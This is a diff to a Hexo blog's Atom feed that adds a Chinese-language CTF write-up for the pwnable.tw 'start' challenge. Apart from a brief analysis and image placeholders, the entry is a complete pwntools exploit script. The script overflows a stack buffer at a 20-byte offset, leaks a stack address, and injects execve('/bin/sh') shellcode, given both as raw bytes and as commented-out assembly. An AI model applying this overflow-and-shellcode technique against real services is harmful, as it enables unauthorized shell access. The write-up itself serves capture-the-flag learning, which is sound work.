@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://bufsnake.github.io/"/>
-  <updated>2019-08-10T08:17:43.321Z</updated>
+  <updated>2019-08-11T04:10:56.092Z</updated>
   <id>https://bufsnake.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwnable.tw-start</title>
+    <link href="https://bufsnake.github.io/pwnable-tw-start.html"/>
+    <id>https://bufsnake.github.io/pwnable-tw-start.html</id>
+    <published>2019-08-11T03:54:32.000Z</published>
+    <updated>2019-08-11T04:10:56.092Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p><img src="/images/pasted-0.png" alt="upload successful"></p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/images/pasted-3.png" alt="upload successful"></p><h3 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h3><p><img src="/images/pasted-1.png" alt="upload successful"></p><blockquote><p>发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的</p></blockquote><p><img src="/images/pasted-2.png" alt="upload successful"></p><blockquote><p>gdb调试得知偏移为20</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pro = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">shellcode = asm('\n'.join([</span></span><br><span class="line"><span class="string">    'push %d' % u32('/sh\0'),</span></span><br><span class="line"><span class="string">    'push %d' % u32('/bin'),</span></span><br><span class="line"><span class="string">    'xor edx, edx',</span></span><br><span class="line"><span class="string">    'xor ecx, ecx',</span></span><br><span class="line"><span class="string">    'mov ebx, esp',</span></span><br><span class="line"><span class="string">    'mov eax, 0xb',</span></span><br><span class="line"><span class="string">    'int 0x80',</span></span><br><span class="line"><span class="string">]))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pro.readuntil(<span class="string">"CTF:"</span>)</span><br><span class="line">pro.send(<span class="string">'a'</span>*<span class="number">20</span> + p32(ret))</span><br><span class="line">shell_addr = u32(pro.recv()[:<span class="number">4</span>])</span><br><span class="line">pro.send(<span class="string">'A'</span>*<span class="number">20</span>+p32(shell_addr+<span class="number">20</span>)+shellcode)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;start&quot;&gt;&lt;a href=&quot;#start&quot; class=&quot;headerlink&quot; title=&quot;start&quot;&gt;&lt;/a&gt;start&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-0.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/
+      
+    
+    </summary>
+    
+      <category term="pwn" scheme="https://bufsnake.github.io/categories/pwn/"/>
+    
+    
+      <category term="pwn" scheme="https://bufsnake.github.io/tags/pwn/"/>
+    
+      <category term="writeup" scheme="https://bufsnake.github.io/tags/writeup/"/>
+    
+      <category term="pwnable.tw" scheme="https://bufsnake.github.io/tags/pwnable-tw/"/>
+    
+  </entry>
   
   <entry>
     <title>Heap的学习(1)</title>
